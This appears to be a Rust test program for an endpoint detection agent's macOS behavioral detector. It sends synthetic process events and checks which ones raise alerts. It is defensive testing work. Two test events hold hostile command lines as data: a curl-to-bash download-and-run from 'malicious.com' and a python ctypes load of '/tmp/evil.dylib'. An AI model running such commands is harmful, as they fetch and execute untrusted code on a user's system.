use std::collections::HashMap;
use tokio::sync::mpsc;
use edr_agent::detectors::behavioral::BehavioralDetector;
use edr_agent::detectors::Detector;
use edr_agent::config::BehavioralDetectorConfig;
use edr_agent::events::{Event, EventData, ProcessEventData, EventType};
use chrono::Utc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔍 Testing macOS Detection Capabilities");
    
    // Create detector configuration with all required fields
    let config = BehavioralDetectorConfig {
        enabled: true,
        scan_interval_ms: 1000,
        alert_threshold: 0.4,
        prevention_threshold: 0.8,
        track_api_calls: true,
        monitor_memory_operations: true,
        monitor_thread_operations: true,
        cross_platform_detection: true,
        system_process_contexts: HashMap::new(),
        alert_frequency_limits: HashMap::new(),
        path_context_rules: HashMap::new(),
        network_behavior_rules: HashMap::new(),
        time_based_risk_adjustment: Default::default(),
        process_whitelist: Default::default(),
    };
    
    let (alert_sender, mut alert_receiver) = mpsc::channel(100);
    
    // Create behavioral detector
    let detector = BehavioralDetector::new(
        config,
        alert_sender,
        "test-agent".to_string(),
        "test-host".to_string(),
    ).await?;
    
    detector.start().await?;
    
    println!("✅ Behavioral detector started");
    
    // Test 1: mdworker in expected location (should NOT trigger alert)
    println!("\n📋 Test 1: mdworker process in expected location");
    let mdworker_expected_event = create_test_process_event(
        1,
        "mdworker_shared".to_string(),
        "/System/Library/Frameworks/CoreServices.framework/mdworker_shared".to_string(),
        Some(0),
    )?;

    detector.process_event(&mdworker_expected_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(50),
        alert_receiver.recv()
    ).await;

    if alert.is_ok() && alert.unwrap().is_some() {
        panic!("❌ Test 1 FAILED: mdworker in expected location should NOT trigger alert");
    }
    println!("✅ Test 1 PASSED: No alert for legitimate mdworker process");

    // Test 2: mdworker in unexpected location (should trigger alert)
    println!("📋 Test 2: mdworker process in unexpected location");
    let mdworker_suspicious_event = create_test_process_event(
        2,
        "mdworker_shared".to_string(),
        "/tmp/mdworker_shared".to_string(),
        Some(1),
    )?;

    detector.process_event(&mdworker_suspicious_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 2 FAILED: mdworker in /tmp should trigger alert");
    println!("✅ Test 2 PASSED: Alert generated for mdworker in suspicious location");
    
    // Test 3: Process from /tmp (suspicious location)
    println!("📋 Test 3: Process from /tmp directory");
    let tmp_injector_event = create_test_process_event(
        3,
        "suspicious_injector".to_string(),
        "/tmp/injector".to_string(),
        Some(1),
    )?;

    detector.process_event(&tmp_injector_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 3 FAILED: process from /tmp should trigger alert");
    println!("✅ Test 3 PASSED: Alert generated for process in /tmp");

    // Test 4: sharingd in unexpected location (should trigger alert)
    println!("📋 Test 4: sharingd process in unexpected location");
    let sharingd_suspicious_event = create_test_process_event(
        4,
        "sharingd".to_string(),
        "/tmp/sharingd".to_string(),
        Some(1),
    )?;

    detector.process_event(&sharingd_suspicious_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 4 FAILED: sharingd in /tmp should trigger alert");
    println!("✅ Test 4 PASSED: Alert generated for sharingd in suspicious location");

    // Test 5: ReportCrash in wrong location (high severity)
    println!("📋 Test 5: ReportCrash process in suspicious location");
    let reportcrash_suspicious_event = create_test_process_event(
        5,
        "ReportCrash".to_string(),
        "/tmp/ReportCrash".to_string(),
        Some(1),
    )?;

    detector.process_event(&reportcrash_suspicious_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 5 FAILED: ReportCrash in /tmp should trigger alert");
    println!("✅ Test 5 PASSED: Alert generated for ReportCrash in suspicious location");

    // Test 6: Shell execution from suspicious location
    println!("📋 Test 6: Shell process in suspicious macOS location");
    let shell_suspicious_event = create_test_process_event(
        6,
        "zsh".to_string(),
        "/tmp/zsh".to_string(),
        Some(1000),
    )?;

    detector.process_event(&shell_suspicious_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 6 FAILED: zsh in /tmp should trigger alert");
    println!("✅ Test 6 PASSED: Alert generated for shell in suspicious location");

    // Test 7: Browser-spawned shell (common in web exploits)
    println!("📋 Test 7: Shell with suspicious command line");
    let browser_shell_event = create_test_process_event_with_cmdline(
        7,
        "bash".to_string(),
        "/bin/bash".to_string(),
        Some(2000),
        Some("bash -c 'curl http://malicious.com/payload.sh | bash'".to_string()),
    )?;

    detector.process_event(&browser_shell_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 7 FAILED: suspicious command line should trigger alert");
    println!("✅ Test 7 PASSED: Alert generated for suspicious command line");

    // Test 8: Process from /tmp
    println!("📋 Test 8: Process from /tmp with suspicious name");
    let tmp_fake_updater_event = create_test_process_event(
        8,
        "dylib_injector".to_string(),
        "/tmp/fake_updater".to_string(),
        Some(1),
    )?;

    detector.process_event(&tmp_fake_updater_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 8 FAILED: process from /tmp should trigger alert");
    println!("✅ Test 8 PASSED: Alert generated for process in /tmp");

    // Test 9: Process execution from Downloads directory
    // Note: Downloads is NOT in the suspicious paths list, so this may not trigger
    println!("📋 Test 9: Process execution from Downloads directory");
    let downloads_event = create_test_process_event(
        9,
        "suspicious_app".to_string(),
        "/Users/user/Downloads/suspicious_app".to_string(),
        Some(3000),
    )?;

    detector.process_event(&downloads_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Downloads directory is not in suspicious paths, so we don't assert
    let _alert = tokio::time::timeout(
        std::time::Duration::from_millis(50),
        alert_receiver.recv()
    ).await;

    println!("ℹ️  Test 9: Downloads directory not in suspicious paths (expected behavior)");

    // Test 10: Command line with macOS-specific suspicious patterns
    println!("📋 Test 10: Command with macOS injection patterns");
    let macos_injection_cmd_event = create_test_process_event_with_cmdline(
        10,
        "python3".to_string(),
        "/usr/bin/python3".to_string(),
        Some(1000),
        Some("python3 -c 'import ctypes; ctypes.CDLL(\"/tmp/evil.dylib\")'".to_string()),
    )?;

    detector.process_event(&macos_injection_cmd_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(100),
        alert_receiver.recv()
    ).await;

    assert!(alert.is_ok() && alert.unwrap().is_some(),
        "❌ Test 10 FAILED: command with injection patterns should trigger alert");
    println!("✅ Test 10 PASSED: Alert generated for injection command pattern");

    // Test 11: Normal process in expected location (should NOT trigger alert)
    println!("📋 Test 11: Normal process in expected location");
    let normal_event = create_test_process_event(
        11,
        "ls".to_string(),
        "/bin/ls".to_string(),
        Some(1000),
    )?;

    detector.process_event(&normal_event).await?;
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    let alert = tokio::time::timeout(
        std::time::Duration::from_millis(50),
        alert_receiver.recv()
    ).await;

    if alert.is_ok() && alert.unwrap().is_some() {
        panic!("❌ Test 11 FAILED: Normal /bin/ls should NOT trigger alert");
    }
    println!("✅ Test 11 PASSED: No alert for legitimate process");

    println!("\n✅ All macOS detection tests PASSED");
    println!("🔍 Validated capabilities:");
    println!("   ✓ System process context recognition (mdworker, sharingd, ReportCrash)");
    println!("   ✓ Suspicious path detection (/tmp directory)");
    println!("   ✓ Shell execution monitoring from untrusted locations");
    println!("   ✓ Command line pattern analysis (curl piped to bash, ctypes dylib loading)");
    println!("   ✓ Negative validation (legitimate processes don't trigger false positives)");
    println!("   ✓ Risk scoring and alert generation");
    
    Ok(())
}

fn create_test_process_event(
    pid: u32,
    name: String,
    path: String,
    ppid: Option<u32>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid,
            name,
            path,
            command_line: None,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata: HashMap::new(),
        content_hash: None,
        security_critical: false,
    };
    
    Ok(event)
}

fn create_test_process_event_with_cmdline(
    pid: u32,
    name: String,
    path: String,
    ppid: Option<u32>,
    command_line: Option<String>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid,
            name,
            path,
            command_line,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata: HashMap::new(),
        content_hash: None,
        security_critical: false,
    };
    
    Ok(event)
}

